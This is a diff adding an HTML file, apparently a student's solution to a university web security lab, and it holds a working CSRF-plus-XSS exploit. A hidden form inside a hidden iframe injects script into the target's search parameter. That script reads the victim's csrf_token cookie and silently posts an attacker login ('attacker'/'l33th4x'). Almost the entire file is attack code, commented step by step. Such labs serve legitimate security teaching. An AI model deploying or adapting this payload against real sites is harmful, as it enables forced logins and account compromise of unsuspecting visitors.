@@ -1,0 +1,79 @@
+<!-- source : https://www.kirupa.com/html5/making_http_requests_js.htm !-->
+<!-- SOurce: http://michael-coates.blogspot.com/2008/06/cross-site-scripting-blacklist-vs.html !-->
+<!-- Get Cookie name Source: https://stackoverflow.com/questions/10730362/get-cookie-by-name !-->
+
+<!-- This HTML file was made by Konstantino Sparakis --!>
+
+
+
+<!-- Loading in jquery from a CDN, requires active internet connection!-->
+<script src="https://code.jquery.com/jquery-1.12.3.min.js" integrity="sha256-aaODHAgvwQW1bFOGXMeX+pC4PZIPsvn2h1sArYOhgXQ=" crossorigin="anonymous"></script>
+
+
+
+<!-- This form points to our target, post function, it is hidden and has our fake data, 
+by targeting out iframe we ensure that the page doesnt go to where the action is and it stays hidden.-->
+<form name="CSRF" id="formal" target="hiddeniframe" method="get" action="http://cs558web.bu.edu/project2/search">
+    <input type="hidden" name="xssdefense" value="0">
+    <input type="hidden" name="csrfdefense" value="1">
+    <input type="hidden" name="q" value="">
+</form>
+
+<iframe name="hiddeniframe"></iframe>
+
+<script>
+    //FUNCTION found on stack overflow for extracting the cookie, source is at top of file
+    function getCookie(name) {
+        var value = "; " + document.cookie;
+        var parts = value.split("; " + name + "=");
+        if (parts.length == 2) return parts.pop().split(";").shift();
+    }
+
+
+
+    //This is my payload function, it gets the csrf_token, adds that along with my other post values and then executes a post.
+    function payload() {
+        var xhr = new XMLHttpRequest();
+        var cc = getCookie("csrf_token")
+        var formData = {
+            username: "attacker"
+            , password: "l33th4x"
+            , csrf_token: cc
+            , csrfdefense: 1
+            , xssdefense: 0
+        };
+
+        $.ajax({
+            url: "http://cs558web.bu.edu/project2/login"
+            , type: "POST"
+            , data: formData
+            , success: function (data, textStatus, jqXHR) {}
+            , error: function (jqXHR, textStatus, errorThrown) {}
+        });
+
+    }
+
+    $(document).ready(function () {
+
+
+        //Linking jquery to my attack 
+        var linker = "<script src='https://code.jquery.com/jquery-1.12.3.min.js' integrity='sha256-aaODHAgvwQW1bFOGXMeX+pC4PZIPsvn2h1sArYOhgXQ=' crossorigin='anonymous'><" + "/script>"
+
+        // Taking my funcitons and making them into strings
+        var payloadString = "<script>" + payload.toString() + getCookie.toString() +
+            ";payload();</" + "script>"
+
+        //Concating the jquery link with my payload
+        var url = linker + payloadString
+
+        //Changes the forms value to include my payload
+        $("input[name=q]").val(url);
+        //Submits the form
+        CSRF.submit()
+
+        //Hides the iframe from the users view
+        $("iframe[name=hiddeniframe]").hide();
+
+
+    });
+</script>
